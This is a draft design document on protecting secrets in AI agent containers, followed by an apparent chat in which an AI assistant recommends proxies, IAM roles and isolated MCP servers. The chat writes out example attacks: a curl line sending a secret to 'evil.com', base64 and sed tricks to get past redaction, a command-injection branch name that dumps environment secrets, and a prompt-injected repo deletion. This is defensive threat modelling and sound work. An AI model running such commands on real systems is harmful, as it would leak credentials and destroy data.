# Agent Container Secrets: Design

Status: draft
Author: Vahid Eyorokon

---

## Problem

Agent containers need secrets to do useful work — API keys, CLI auth tokens, MCP server credentials. Currently the anthropic API key is passed as a plaintext env var (proxy bypassed). Other secrets (GITHUB_TOKEN, AWS creds, MCP tokens) have no injection path at all.

Threat model: a compromised agent process, malicious MCP, or careless `echo $SECRET` could leak credentials through the observable output stream, logs, or network exfiltration.

## Security Layers

Three layers, each addressing a different attack surface:

### Layer 1: Secret File Mounts (protect at rest)

**Already built.** `build_api_key_files()` writes secrets to `/run/secrets/<name>` with 0600 root:root permissions. The provisioning flow (`_provision_api_key_files`) handles both Docker and Modal via the runtime adapter.

**What it protects against:**
- `docker inspect` (secrets not in container env config)
- `/proc/1/environ` (secrets not in Docker's env injection)
- Other containers on the same network
- Agent user reading secret files directly (root-only)

**What it doesn't protect against:**
- The agent process itself (it needs the secret to use it)

**Generalization needed:**
- Accept a `secrets: dict[str, str]` on agent creation (name → value)
- Write each to `/run/secrets/env/<NAME>` (0600 root:root)
- s6 oneshot (`init-secrets`) reads all files in `/run/secrets/env/`, exports as env vars
- Downstream services inherit the env — `gh` sees `GITHUB_TOKEN`, `aws` sees creds, etc.

### Layer 2: HTTP Proxy for High-Value Keys (protect in transit)

**Already built.** `api-proxy.py` runs on localhost:9999, reads the real key from `/run/secrets/proxy_key`, injects it into outbound requests to `api.anthropic.com`. The relay gets a placeholder key that passes Claude CLI validation but isn't real.

**What it protects against:**
- Everything in Layer 1, plus:
- `echo $ANTHROPIC_API_KEY` prints the placeholder, not the real key
- `env | grep` shows nothing useful
- Process memory inspection of the relay process

**When to use:** Only for the highest-value secrets where leakage = direct financial cost (anthropic API key). The proxy overhead (extra hop, streaming complexity) isn't worth it for every secret.

**Status:** Code complete, logically disabled behind tech-debt comment. Two-line revert to enable (task #11).

### Layer 3: Output Stream Redaction (protect in output)

**Not yet built.** This is the insight — since relay.py processes every line of Claude Code output before forwarding to the backend/dashboard, we can scrub secrets from the observable output stream.

**How it works:**
1. At relay boot, read all secret values from `/run/secrets/*` into a set
2. Before forwarding any output line to the backend WebSocket, scan for substrings matching any known secret value
3. Replace matches with `[REDACTED]`
4. Same pattern as GitHub Actions secret masking in CI logs

**Insertion point: relay.py**

relay.py is the chokepoint — every line of Claude Code stdout/stderr flows through it before reaching the backend and dashboard. Redact here and the human never sees raw secrets in the UI. The relay already processes output line-by-line for event parsing, so adding a redaction pass is natural.

```
Claude Code stdout → relay.py parse → REDACT → WebSocket → backend → dashboard
```

**What it protects against:**
- `echo $GITHUB_TOKEN` in Claude Code output → prints `[REDACTED]`
- `env | grep TOKEN` → values redacted
- `cat .env` → values redacted
- Accidental credential printing by Claude Code or tools
- MCP tools that log sensitive values

**What it doesn't protect against:**
- Network exfiltration (process sends secret to external URL directly)
- Writing secrets to files (then reading the file through a different channel)
- Encoding/obfuscation (base64-encoding the secret before printing)

**Implementation sketch:**

```python
# relay.py — at boot
import os, re

_SECRETS: set[str] = set()

def _load_secrets():
    secrets_dir = "/run/secrets"
    if not os.path.isdir(secrets_dir):
        return
    for name in os.listdir(secrets_dir):
        path = os.path.join(secrets_dir, name)
        if os.path.isfile(path):
            try:
                val = open(path).read().strip()
                if len(val) >= 8:  # skip trivially short values
                    _SECRETS.add(val)
            except PermissionError:
                pass  # root-only files when running as agent

def redact(text: str) -> str:
    for secret in _SECRETS:
        if secret in text:
            text = text.replace(secret, "[REDACTED]")
    return text
```

Then in the output forwarding path:
```python
# Before sending to WebSocket
line = redact(raw_line)
```

**Edge cases:**
- Partial matches across chunk boundaries → buffer last N chars, flush on next chunk
- Performance with many secrets → for <50 secrets, naive string replacement is fine
- Secret substrings appearing in normal text → unlikely for real tokens (high entropy)
- Relay runs as `agent` user, some secret files are root-only → relay reads what it can at boot; the proxy handles the ones it can't read

## Combined Security Posture

| Attack | Layer 1 (mounts) | Layer 2 (proxy) | Layer 3 (redaction) |
|--------|:-:|:-:|:-:|
| `docker inspect` | blocked | blocked | n/a |
| `/proc/1/environ` | blocked | blocked | n/a |
| `echo $SECRET` | exposed | blocked (anthropic only) | **redacted** |
| `env \| grep` | exposed | blocked (anthropic only) | **redacted** |
| Network exfiltration | exposed | blocked (anthropic only) | exposed |
| Read secret files | blocked (root-only) | blocked | n/a |
| Malicious MCP reading env | exposed | blocked (anthropic only) | n/a (MCP sees env, but output redacted) |

## Recommended Approach

**For anthropic API key:** All three layers. Highest-value secret, proxy already built.

**For other secrets (gh, aws, MCP tokens):**
- Layer 1 (mounts) + Layer 3 (redaction) as baseline
- Scoped, short-lived tokens where the service supports them (gh fine-grained PATs, AWS STS)
- Token expiry = defense in depth. Even if leaked, damage is time-bounded.

**Priority order:**
1. Re-enable anthropic proxy (task #11) — two-line revert, fixes 2 failing tests
2. Output redaction in relay.py — standalone, ~50 lines, high value
3. Generalized secret injection (s6 oneshot + schema changes) — enables the full pattern
4. Short-lived token generation — per-service integration work

## Schema Changes Needed

```python
# Agent model or separate AgentSecret model
# Option A: JSON field on Agent (simple, fine for <20 secrets)
secrets = models.JSONField(default=dict, blank=True)  # {"GITHUB_TOKEN": "ghp_...", "AWS_ACCESS_KEY_ID": "..."}

# Option B: separate model (better for audit trail, rotation)
class AgentSecret(models.Model):
    agent = models.ForeignKey(Agent, related_name="secrets")
    name = models.CharField(max_length=100)  # env var name
    value = models.TextField()  # encrypted at rest (TODO)
    created_at = models.DateTimeField(auto_now_add=True)
```

Option A for now. Option B when we need rotation/audit.

## Open Questions

1. **Should secrets be per-agent or per-project?** Most teams share the same GitHub token. Per-project with agent-level overrides?
2. **Encryption at rest?** `Project.anthropic_api_key` is already plaintext CharField. Same tech debt applies here. Fix both together.
3. **Secret rotation?** Out of scope for v1. The mount+inject pattern supports it (rewrite file, restart service) but no UI/automation yet.
4. **MCP-specific secrets?** Some MCPs need their own auth. Should the MCP registry entry include a `secrets` field that maps env var names?


AGENT CONVO FOLLOWS: 
This is a deeply scoped and realistic threat model, especially for an AI agent container where the code being executed is inherently untrusted, hallucination-prone, or potentially executing malicious payloads from prompt injection.

To answer your core question directly: There is no native OS-level mechanism, s6 plugin, or Docker feature that allows a process to possess an environment variable but prevents it from reading/printing it. Once a secret is in a process's environment space or memory, the process owns it. It can echo it, base64 encode it to bypass Layer 3 redaction, or curl -X POST -d "$SECRET" evil.com.

Therefore, the only foolproof pattern for "use but never expose" is to ensure the agent process never possesses the real secret in the first place.

Here are the cleaner, industry-standard patterns to achieve this, moving from immediate tactical fixes to architectural shifts.

Pattern 1: The Egress Gateway / Transparent Proxy (Scaling your Layer 2)

Your Layer 2 (HTTP Proxy) is actually the most secure paradigm you have. Instead of viewing it as a special case for the Anthropic key, you can elevate it to the primary secret handling mechanism for all HTTP-based APIs.

How it works: The container's environment variables (like GITHUB_TOKEN or ANTHROPIC_API_KEY) are populated with validly formatted dummy tokens (e.g., ghp_dummy12345). All outbound traffic is routed through a local sidecar proxy (like Envoy, mitmproxy, or your custom Python proxy). The proxy intercepts the request, strips the dummy token, injects the real secret from its own root-protected memory, and forwards the request.

Why it’s foolproof: If the agent runs echo $GITHUB_TOKEN, it prints ghp_dummy12345. If it exfiltrates the token to a malicious server, the attacker gets a useless string.

The Catch: This requires MITMing TLS traffic. You have to configure the agent's tools (like gh CLI or curl) to trust a local Certificate Authority (CA) generated by your proxy so the proxy can decrypt, inject the header, and re-encrypt.

Pattern 2: The Local Credential Broker (The AWS IMDS Approach)

If you don't want to MITM all traffic, you can use the pattern pioneered by cloud providers: a local metadata service that vends ultra-short-lived, scoped credentials on demand.

How it works: You run a local daemon inside the container network (or via an s6 managed service) listening on a local loopback address (e.g., 127.0.0.1:8080 or a Unix Domain Socket).

The Workflow:

The agent process does not have AWS_ACCESS_KEY_ID.

Instead, it is configured to request credentials from the local broker endpoint.

The broker (which has the master secrets mounted securely via Layer 1) authenticates the local request, dynamically generates a 15-minute token (via AWS STS, GitHub fine-grained PATs, etc.), and returns it.

Tools for this: * HashiCorp Vault Agent: This is the industry standard for this exact problem. Vault Agent runs as a sidecar/daemon, authenticates itself, and manages the lifecycle (fetching, caching, and rotating) of secrets. It can write them to an ephemeral tmpfs mount or serve them over a local socket.

Mocking Cloud Metadata: For AWS specifically, you can mock the EC2 Instance Metadata Service (IMDS) at 169.254.169.254. The AWS CLI and SDKs automatically look for this IP to fetch credentials if environment variables are missing. Your broker intercepts this and vends STS tokens.

A Critique of Layer 3 (Redaction)

Output stream redaction is excellent for User Experience (preventing a developer from accidentally screen-sharing a key that an agent dumped in the chat), but it should be considered Security Theater against a compromised process or malicious MCP.

Why? Because redaction relies on exact string matching. A compromised process can trivially bypass your relay.py redaction by executing:

Bash
echo $GITHUB_TOKEN | base64
# or
echo $GITHUB_TOKEN | sed 's/./& /g' # prints token with spaces
Redaction is a good defense-in-depth UI feature, but do not rely on it as a security boundary.

What to do with s6 specifically

If you are using s6, you are likely familiar with s6-envdir.
Currently, you might be doing something like: s6-envdir /run/secrets/env s6-setuidgid agent claude-code.

To harden this without building a full proxy:

Drop privileges aggressively: Ensure the secret files in /run/secrets/env are strictly 0400 root:root.

Use s6-envdir safely: When s6-envdir runs as root, it reads the files, sets the environment space, and then s6-setuidgid drops to the agent user before execing the payload. The agent user cannot read the files on disk anymore, but does have the secrets in memory.

Combine with Ephemeral Tokens: Ensure the values written to /run/secrets/env by the orchestrator are already short-lived (e.g., maximum 1-hour expiration). If they leak via an env dump, the blast radius is time-boxed.

Recommended Architecture (The "Foolproof" Stack)

If you want the absolute highest security posture for this specific use case:

High-Value APIs (Anthropic/OpenAI): Keep Layer 2. The Transparent Egress Proxy is unbeatable here because you strictly control the destination domain. Inject the real key out-of-process.

Cloud SDKs (AWS/GCP): Use a local Metadata Service Mock. Do not pass static long-lived AWS keys into the container. Vend temporary IAM/STS tokens via a local daemon that the SDKs naturally know how to query.

Third-Party CLIs (GitHub, etc.): Use Layer 1 (s6-envdir mounting short-lived tokens generated right before container start). Rely on token expiry rather than trying to perfectly obfuscate an environment variable from the process that owns it.

UI: Keep Layer 3, but explicitly document it as a "UX safety net," not a security control against data exfiltration.

Would you like to explore the implementation details of mocking the local metadata service for AWS/Cloud tooling, or focus on expanding the transparent HTTP proxy for other services?

>> oh interesting. we are planning on using aws - maybe we could even attach like IAM roles or soemthing somehow to enable certian things idk if thats a pattern for this? or something and if theres a solution there. we are planning on using aws secret manager too

You hit the nail on the head. This is exactly the enterprise-standard pattern, and it completely eliminates the need to pass static AWS keys (AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY) into your container's environment.

By leaning into AWS IAM (Identity and Access Management) and AWS Secrets Manager, you shift from "managing secrets" to "managing identities."

Here is how this architecture works in practice for agent containers.

1. The "No-Keys" Pattern: IAM Roles for Containers

Instead of giving a container a set of keys, you give the container an Identity (an IAM Role). How this is attached depends on your compute layer:

AWS ECS (Elastic Container Service): You assign a Task Role.

AWS EKS (Kubernetes): You use IAM Roles for Service Accounts (IRSA) or EKS Pod Identity.

Raw EC2: You attach an Instance Profile.

How the magic works:
When you attach a role this way, AWS injects a local metadata endpoint into the container network (e.g., a specific IP address or a local environment variable pointing to a credential provider).

When your agent runs an AWS tool (like the AWS CLI or boto3 in Python), the tool automatically checks for environment variables. When it doesn't find them, it inherently knows to query that local metadata endpoint. The endpoint verifies the container's identity and returns temporary, short-lived STS credentials (valid for say, 15 to 60 minutes).

Security Posture: * No static keys exist.

If the agent gets compromised and dumps its memory, the attacker only gets a token that expires in minutes and is bound strictly to the permissions of that specific IAM role.

2. AWS Secrets Manager for Third-Party Keys

You can use that same IAM identity to solve your Layer 1 and Layer 2 problems for non-AWS secrets (like your Anthropic API key, GitHub tokens, or MCP credentials).

Instead of mounting secrets at build/provision time, the flow looks like this:

Store your Anthropic Key and GitHub PAT in AWS Secrets Manager.

Give your container's IAM Role the strict permission secretsmanager:GetSecretValue for only those specific secret ARNs.

At container boot (s6 init stage): A lightweight startup script (running as root) uses the IAM role to fetch the secrets dynamically from AWS Secrets Manager.

The script writes these to your /run/secrets/ RAM disk (tmpfs) and sets the permissions to 0400.

s6 drops privileges to the agent user and starts the actual application.

3. The Ultimate Architecture: IAM + Transparent Proxy

If you want to make this genuinely foolproof against a rogue agent process, you combine AWS IAM, Secrets Manager, and your Layer 2 Proxy.

In this setup, the untrusted claude-code agent process never even sees the third-party tokens.

The Proxy Daemon: Your local api-proxy.py daemon runs inside the container (or as a sidecar) under a different user profile.

Proxy Fetches Secrets: The proxy, using the container's IAM Role, calls AWS Secrets Manager on boot to fetch the real Anthropic Key and GitHub token into its protected memory.

Agent Environment: The agent process is spawned with dummy environment variables (ANTHROPIC_API_KEY=dummy, GITHUB_TOKEN=dummy).

Traffic Interception: When the agent tries to call api.anthropic.com or api.github.com, your proxy intercepts the request, swaps the dummy token for the real one held in memory, and forwards it out.

In this scenario, a malicious prompt injection cannot exfiltrate the keys because the keys literally do not exist in the agent's process space, environment variables, or accessible file system.

Would you like to drill down into how to configure the local transparent proxy to intercept standard CLI traffic (like the gh tool), or focus on how to set up the container execution environment (ECS vs EKS) to inject the IAM roles?

>> would it work for tools that are dnamically installed in the container? like say the agent needs github cli. so it adds it. and says "need you to set the github token or whatever" the user then sets it in the app's interface and the container restarts. so the agent knows the token was set - and this is where it gets blurry - somehow we need their cli (gh) to be able to use it or somethign without the secret ever being in the container? or something yk? am i over thinking this? is there a solution here for this? has anyone solved this

You are hitting the exact ceiling of operating system security, and you are not overthinking it. This is a notorious, bleeding-edge problem in the AI agent space right now.

To answer your question directly: No one has solved this perfectly for arbitrary, dynamically installed CLIs without introducing massive friction. Here is the fundamental reality of Linux process trees: If your untrusted agent process (e.g., a Python script running the LLM loop) is the parent process that spawns the gh CLI (via subprocess.run or bash), the parent process inherently controls and can inspect the child. If the gh CLI needs the token in its environment or a file, the agent process can read that environment or file.

However, the industry has two main ways of handling this, depending on how paranoid you want to be.

1. The Pragmatic Approach: Ephemeral Scoping (What most do)

For dynamically installed tools like the GitHub CLI, trying to MITM-proxy every possible tool is a nightmare because many CLIs use custom certificate stores or employ certificate pinning, which breaks when a local proxy tries to intercept the TLS traffic.

Instead of trying to hide the secret from the agent, you neuter the secret's power.

How it works: When the agent says, "I need a GitHub token," the UI explicitly prompts the user to generate a Fine-Grained PAT (Personal Access Token) scoped only to the specific repository the agent is working on, with a short expiration date.

The Flow: The UI saves this to AWS Secrets Manager. The container restarts. Your s6 init script pulls it and writes it to the environment (Layer 1). The agent uses gh normally. Output is redacted (Layer 3).

Why it's acceptable: If the agent goes rogue and exfiltrates the token, the blast radius is contained to a single repo for a few days. You aren't fighting the OS; you are limiting the damage.

2. The Advanced Approach: MCP as a Security Boundary (The real solution)

Since you mentioned MCP (Model Context Protocol) in your design document, this is actually the exact architectural problem MCP is designed to solve.

Instead of letting the agent arbitrarily install gh and run it via bash, you shift the execution of sensitive tools out of the agent's process space entirely.

The Trust Boundary: The core agent loop (which is vulnerable to prompt injection) runs in Process A. The tools run in Process B (an MCP server).

How it works dynamically:

The agent realizes it needs GitHub access.

Instead of apt install gh, the agent requests the system to spin up the GitHub MCP Server.

The UI prompts the user for the token. The backend saves it to Secrets Manager.

The system spins up the GitHub MCP Server (which runs under a different user or even a separate sidecar container). Only the MCP server gets the token.

The agent communicates with the MCP server via standard JSON-RPC over stdio or HTTP. It says: {"method": "create_pull_request", "params": {"repo": "user/repo", "title": "Fix bug"}}.

The MCP server uses the token to make the API call and returns the result to the agent.

Why it's foolproof: The agent literally never possesses the GitHub token. It only has the ability to ask the MCP server to perform specific, predefined actions. Even if the agent executes env | grep -i token, it finds nothing.

Summary of the Best Path Forward

For AWS/Cloud Infrastructure: Use IAM Roles and local metadata mocking. Zero keys inside the container.

For your own high-value APIs (Anthropic): Keep your Layer 2 Proxy.

For dynamic integrations (GitHub, Linear, etc.): Push hard toward the MCP model. If a user needs a new tool, they add the MCP server for it, not the raw CLI.

For raw CLIs (if you must support them): Fall back to Layer 1 (Env Mounts) + Layer 3 (Redaction) and rely heavily on user education to only provide tightly scoped, fine-grained tokens. 

Would you like to explore how to enforce that the agent uses MCP servers instead of trying to run apt-get and bash scripts for these sensitive workflows

>>gotcha so the solution is mcp and can mcps reference secret manager secrets so we dont have to embed them directly in the agents mcp config or do we have a "sidecar" or soemthing attached to them where the secrets live in and their commands actually execute or something or like iam roles that help.. ugh im confused.

Take a deep breath. You are confused because you've correctly identified a massive paradox in how people currently talk about AI agents. Most tutorials show the agent process reading a configuration file (like `mcp.json`), pulling secrets out of it, and spawning the MCP server as a child process.

If the agent can read the config file to spawn the server, **the agent can read the secret.** That defeats the whole purpose.

To actually achieve the security boundary you want, you have to separate *who* manages the secrets from *who* uses the tools. Here are the three ways to actually solve this, moving from easiest to most enterprise.

### 1. The Orchestrator Pattern (Using your s6 setup)

Instead of the agent (`claude-code`) being the parent process that spawns the MCP server, you make your container orchestrator (`s6`) the parent of *both*.

* **How it works:** * `s6` starts Service A: The Agent (`claude-code`). It gives Service A *no* secrets.
* `s6` starts Service B: The GitHub MCP Server. It passes `GITHUB_TOKEN` as an environment variable *only* to Service B.
* The MCP Server is configured to listen on a local port or a Unix Domain Socket instead of standard input/output (stdio).
* The Agent is told, "Hey, your GitHub MCP is available at `http://localhost:8000/sse`."


* **Why it works:** The agent process never touches the token. It just sends JSON requests to the local port.

### 2. The Reference Pattern (AWS Secrets Manager + IAM)

If you are using AWS Secrets Manager, you don't even need to pass the real secret in environment variables at all. You pass a *reference* to the secret.

* **How it works:**
* In the MCP configuration, instead of `GITHUB_TOKEN=ghp_12345`, you set `GITHUB_TOKEN_SECRET_ARN=arn:aws:secretsmanager:us-east-1:123456789012:secret:github-token`.
* You give the container an AWS IAM Role that is allowed to read that specific ARN.
* You modify or wrap the MCP server so that on startup, it uses the AWS SDK to say, "Hey AWS, I am this IAM Role, please give me the string for this ARN."
* The MCP server holds the token in its own memory.


* **Why it works:** Even if the agent reads the MCP config file, all it sees is an AWS ARN. Without the IAM permissions (which you can restrict to the MCP process's specific user ID), the agent can't fetch the actual token.

### 3. The True Sidecar Pattern (Decoupled Compute)

If you want absolute, bulletproof isolation, you don't even run the MCP server in the same container as the agent.

* **How it works:**
* **Container 1 (The Brain):** Runs `claude-code`. It has internet access to Anthropic (via your Layer 2 proxy) but *no* IAM roles and *no* secrets.
* **Container 2 (The Hands / Sidecar):** Runs the MCP servers. *This* container is assigned the AWS IAM Role. *This* container pulls the secrets from Secrets Manager at boot.
* Container 1 talks to Container 2 over your internal AWS network via the MCP SSE (Server-Sent Events) transport.


* **Why it works:** The agent literally cannot access the memory, file system, or environment of the MCP server. It is a completely separate machine. If the agent executes malicious code, it is trapped in a box with no keys.

---

**The Bottom Line:**
To fix the blurriness: **Never let the agent spawn the MCP process.** Let your infrastructure (s6, Docker, or AWS ECS) spawn the MCP process, inject the secret into the MCP process, and then introduce the agent to the MCP process over a network socket.

>> so this way its just a locally running mcp that the agent cant "read the secrets out of" right? are there any vulnerabilities with this approach or is it pretty clean

Yes, exactly. You’ve successfully arrived at the cleanest, most enterprise-grade pattern for this problem. By decoupling the MCP server from the agent process, you shift the security boundary from "trying to hide things in memory" to standard, battle-tested Operating System process isolation.

It is a very clean approach, but it is not a silver bullet. While this architecture stops the agent from stealing the secret, it opens up a different class of vulnerabilities.

Here is a breakdown of why this works, and the specific vulnerabilities you still need to design around.

Why This is "Pretty Clean" (The OS Boundary)

When your orchestrator (like s6) manages the processes independently, you get to leverage Linux user spaces.

Strict User Isolation: You configure s6 to run the agent process as the agent user, and the GitHub MCP server as the mcp-github user.

Environment Isolation: s6 passes the real GITHUB_TOKEN only to the mcp-github process space.

Memory Protection: The Linux kernel strictly prohibits the agent user from reading /proc/<mcp-pid>/environ or dumping the memory of the mcp-github process.

Network/Socket Bindings: They communicate over a restricted Unix Domain Socket (e.g., /run/mcp/github.sock) that only the agent user is allowed to write to.

The Vulnerabilities (What you still have to worry about)

You have successfully protected the string value of the secret. However, you must now protect what the secret can do.

1. The Confused Deputy Problem (API Abuse)

This is your biggest threat model with MCPs. The agent no longer needs to steal your GitHub token if it can just trick the MCP server into doing its dirty work.

If your GitHub MCP exposes a generic tool like execute_graphql_query or make_api_call, the agent can simply prompt-inject a payload that says: {"method": "make_api_call", "endpoint": "DELETE /repos/your-org/core-backend"}. The MCP server, acting as the "confused deputy," happily attaches the secret token and executes the destructive action on the agent's behalf.

The Fix: You must ruthlessly constrain the tools the MCP server exposes. Instead of make_api_call, it should only expose highly specific, safe actions like create_branch or open_pull_request.

2. MCP Server Exploits (Jumping the Gap)

MCP servers are just software, often written quickly. If an MCP server has a vulnerability—like command injection or path traversal—a malicious agent can exploit it.

Scenario: An MCP tool takes a branch_name string and unsafely passes it to a bash script: os.system(f"git checkout {branch_name}").

The Attack: The agent sends the branch name "main; env > /tmp/leaked_secrets.txt; cat /tmp/leaked_secrets.txt".

The Result: The agent just executed code inside the MCP server's process space, meaning it can now print the secret and read it over the socket.

The Fix: Treat MCP servers as untrusted input validators. All inputs from the agent must be strictly sanitized.

3. Misconfigured s6 Permissions

If your s6 setup runs both the agent and the MCP server under the exact same Linux user (or worse, root), the OS-level isolation is bypassed. A clever agent could simply run Python code to read the environment variables of sibling processes owned by the same user.

The Fix: Strictly enforce s6-setuidgid to separate, unprivileged user accounts for every distinct service.

The Verdict

It is the right architecture. You are moving from an unsolvable problem (hiding a secret from the process that owns it) to a solvable problem (securing an API boundary between two distinct processes).

Would you like to draft the actual s6 service directory structure and user permission scripts to see exactly how this local isolation looks in practice?


>>this separation would be clean too since all we would need to do in order to add a new mcp is just add it in and start up the mcp right? or do i still have to restart the agent process

This is one of the biggest operational advantages of decoupling them. But the answer to "do I have to restart the agent" depends on whether you are updating an existing tool or adding a completely new one.

Here is how the architecture handles both scenarios:

Scenario 1: Rotating a Secret or Updating an Existing MCP

No, you do not need to restart the agent. Let's say the GitHub token expires, or you want to update the GitHub MCP server to a newer version.

The UI saves the new token to Secrets Manager.

You restart only the GitHub MCP process (Container 2 or Service B).

The connection briefly drops.

The Agent (claude-code) detects the disconnected socket, automatically retries, and reconnects to the MCP server.

The agent's memory, conversation history, and context are completely preserved. This is a massive win for user experience.

Scenario 2: Adding a Completely NEW MCP

It depends on how you build your agent's "discovery" mechanism.

If your agent is hardcoded to read a config.json file at boot to figure out which MCP servers exist (which is how the standard Claude Desktop app works right now), then yes, you still have to restart the agent process so it can read the new config file and wire up the new connection.

However, since you are building a custom containerized environment, you can build Dynamic Tool Discovery to avoid the restart:

The "Registry" Pattern: Instead of the agent reading a static file, you build a tiny local registry service.

How it works: 1. You spin up the new Jira MCP server on a new local socket (/run/mcp/jira.sock).
2. You register this new socket with your local registry.
3. Your agent runs a background loop that pings the registry every 10 seconds: "Hey, any new tools?"
4. The registry says, "Yep, Jira is available here." 5. The agent connects to it, fetches the tool schemas, and suddenly has Jira capabilities mid-conversation.

This is exactly what Anthropic has been moving toward with the newer /mcp add commands in the Claude Code CLI, which allow dynamically adding tools without killing the REPL session.

Summary

By separating the processes, you isolate the blast radius of both security breaches and application crashes.

If an MCP server crashes, hangs, or needs a token rotation, you just restart the MCP daemon. The agent survives. If you want to get fancy later, you can build dynamic discovery so you never have to restart the agent at all.

Does that make the architecture click a bit better?